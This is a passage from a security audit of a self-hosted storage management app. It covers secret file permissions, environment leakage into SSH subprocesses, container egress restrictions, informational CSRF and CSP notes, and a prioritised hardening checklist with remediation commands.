**Why this is insecure.** The files are `0644` so the container UID can read the bind-mounted secret. Their only protection is the `0700` parent directory. That protection breaks quietly if anyone runs `chmod 755 secrets`, copies the files elsewhere with `cp -p`, or includes them in a backup tarball: the vault master secret is then readable by every local user. `secrets/api_token` is referenced nowhere in the code. An unused secret is pure risk: it is easy to forget and nobody knows what it unlocks.

**Remediation.** `chown 10001:10001 secrets/*` and `chmod 0400`. Or use compose's long-form secrets (`uid: "10001"`, `mode: 0400`) where supported (Swarm, or recent Compose with non-file sources). Delete `secrets/api_token` after confirming nothing external uses it.

---

### SF-11 — SSH subprocesses inherit the full process environment

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `remote.py:103, 109, 114` (no `env=`) |

**Why this is insecure.** If an operator uses `STORAGEFORGE_VAULT_SECRET` / `STORAGEFORGE_SESSION_SECRET` as plain environment variables instead of `*_FILE`, every `ssh` child inherits them. Any `ProxyCommand`, `LocalCommand` or `Match exec` in an ssh config (or a compromised ssh binary) then sees the master secret, and so does `/proc/<child>/environ` for the child's lifetime. `keyinstall.py` and `runner.py` already pass a minimal `env`. `remote.py` is the outlier.

**Remediation.** Pass `env={'PATH': …, 'HOME': …, 'SSH_AUTH_SOCK': sock, 'LANG': 'C.UTF-8'}` in `Transport`. Optionally `os.environ.pop()` both secrets after reading them at start-up.

---

### SF-12 — Unrestricted egress and a flat bridge network

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `docker-compose.yml` `networks`, `examples/demo/compose.demo.yml` |

**Why this is insecure.** The container needs outbound SSH to the fleet, but it can reach **any** address on **any** port. That widens SF-04 and gives any code-execution foothold free exfiltration. The demo target joins the same `sf` network. If someone runs the demo override next to production, a disposable container with a looser sshd sits beside the vault.

**Remediation.** Restrict egress at the host. With `sf0` named, `iptables -I DOCKER-USER -i sf0 -p tcp ! --dport 22 -j REJECT` (plus explicit allows for ntfy/gotify ports, if used). Give the demo its own `networks: [demo]`, and document that `compose.demo.yml` must never be combined with production data volumes.

---

### SF-13 — Informational

| Item | Why it's noted |
|---|---|
| `POST /api/logout` has no CSRF token | `SameSite=Strict` already blocks cross-site cookies. Logout-CSRF is only a nuisance. |
| Side-effecting GETs (`/api/deploy/jobs/<jid>/browse`, script downloads) | Safe today because of `Strict`. They become CSRF-able if someone relaxes to `Lax`. Make them POST. |
| Library `ValueError` text returned to the client | Authenticated only, but could show internal detail. Prefer authored messages. |
| `style-src-attr 'unsafe-inline'` | Allows CSS injection via `style=""` if HTML injection ever appears (no script). The UI uses `textContent`, so the risk is low. |
| `/api/jobs/report` duplicate check is by `run_uuid` only | A leaked job token lets someone forge "ok" runs for that one job and mask a failing backup. Accept only runs whose timestamps fall within the job's schedule window, and alert on runs reported from an unexpected source IP. |
| No CORS | ✅ Intentional and correct. Never add `Access-Control-Allow-Origin: *` with credentials. |

---

## 5. Actionable Hardening Checklist

### 🔴 P0 — now

- [x] **SF-01** Validate `src.host`/`dst.host` in `moves.normalize` and `host` in `changes.normalize` with `keyinstall.HOST` (as `tasks.normalize` does)
- [x] **SF-01** Collapse whitespace in `note` fields (`' '.join(x.split())`) in moves and changes
- [x] **SF-01** Add a `comment()` helper and use it for every `#` line in `moves.script`, `changes.script`, `changes.ansible`, `tasks.script`, `shares.script`
- [x] **SF-01** Regression test: a newline in any free-text field produces no un-commented line in the script header
- [x] **SF-05** Clamp `limit` to `[1, cap]` on `/api/search`, `/api/audit`, `/api/deploy/runs`

### 🟠 P1 — this week

- [x] **SF-03** Server-side revocation on logout (`web_sessions` table), 30-min sessions adjustable to 8 h
- [x] **SF-04** Block loopback, link-local and multicast alert targets (private LAN allowed), disable redirects, return generic errors
- [x] **SF-04** Clear a stored channel token when that channel's URL host changes
- [x] **SF-06** Default `STORAGEFORGE_COOKIE_SECURE=1`; rename the cookie to `__Host-sf_session`; HSTS on https
- [x] **SF-02** Step-up re-authentication (5 min window) for deploy apply, job actions, restore, key generate/install, access/deploy grant, alert settings

### 🟡 P2 — next release

- [ ] **SF-02** Roles (`viewer` / `planner` / `admin`) with a `@requires()` decorator
- [ ] **SF-02** Optional TOTP, required once any host has deploy access
- [ ] **SF-02** Move the signing key into a separate signer process
- [x] **SF-07** Per-user limiter keyed on user + client network; alert on limit hits
- [x] **SF-08** Minimal unauthenticated `/healthz`; drop the version from `Server`
- [x] **SF-09** Pin the base image by digest; hashed `requirements.lock`; remove system pip · Trivy in CI not set up (no CI)
- [x] **SF-10** Secret files `0640` + `group_add` (instead of chown to 10001) · `secrets/api_token` left for the owner to decide
- [x] **SF-11** Minimal `env=` for every `subprocess` in `remote.py`
- [x] **SF-12** `DOCKER-USER` egress rule on `sf0`; separate network for the demo target
- [x] **SF-13** Convert side-effecting GETs to POST

### ✅ Keep (regression guard)

- [ ] `USER 10001`, `read_only`, `cap_drop: ALL`, `no-new-privileges`, tmpfs runtime, app port unpublished (TLS proxy only), `*_FILE` secrets
- [ ] `@login_required` on every new `/api/*` route (consider a test that walks `web.url_map` and fails on unauthenticated routes outside an allow-list)
- [ ] JSON-only bodies and no CORS
- [ ] `shlex.quote` for every value in generated scripts; regex-validated IDs before shell interpolation

---

> [!note] Method and limits
> Static review of the working tree (including uncommitted files), with targeted reproduction of SF-01 against a scratch SQLite database (`moves.script`, `changes.script`; `tasks.normalize` confirmed safe). Not covered: a live container run, image CVE scanning, the JavaScript UI (beyond the CSP), PostgreSQL-specific paths, `jobscript.py`/`storageforge-run` on-host scripts beyond the deploy docstring, and the full text of every check message.
